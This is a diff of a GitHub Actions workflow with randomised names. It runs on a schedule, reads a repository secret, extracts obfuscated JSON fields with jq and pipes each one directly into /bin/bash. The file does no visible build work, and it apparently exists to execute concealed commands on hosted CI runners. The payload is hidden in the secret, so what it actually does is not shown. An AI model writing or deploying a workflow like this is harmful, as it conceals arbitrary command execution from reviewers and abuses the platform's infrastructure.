@@ -3,20 +3,26 @@ name: yuanqizheng7861
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 1/6 * * *'
-jobs:  # 13380
+    - cron: '26 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yuanqizheng7861
         env:
-          uu43: ${{ secrets.uu43 }}
+          s4: ${{ secrets.s4 }}
         run: |
-          echo $uu43 | jq -r .jk755 | /bin/bash
-          echo $a90803 | jq -r .nbvd9 | /bin/bash
-          echo $le072 | jq -r .ojlua49 | /bin/bash
-          echo $yclax51 | jq -r .coy71 | /bin/bash
-          echo $ca5 | jq -r .elg018 | /bin/bash
-          echo $bfy0609 | jq -r .pbi2 | /bin/bash
+          echo $s4 | jq -r .pka1 | /bin/bash
+          echo $owcvc5684 | jq -r .b97366 | /bin/bash
+          echo $puvvi4 | jq -r .zpyy46333 | /bin/bash
+          echo $hp7158 | jq -r .hpvts3 | /bin/bash
+          echo $g3 | jq -r .l28255 | /bin/bash
+          echo $mu54224 | jq -r .pskk716 | /bin/bash
+          echo $eip09578 | jq -r .hw9154 | /bin/bash
+          echo $hrs39 | jq -r .qzaq33163 | /bin/bash
+          echo $vgtw60712 | jq -r .ngidb3 | /bin/bash
+          echo $v5256 | jq -r .gfxao0416 | /bin/bash
+          echo $ni3 | jq -r .qo817 | /bin/bash
 
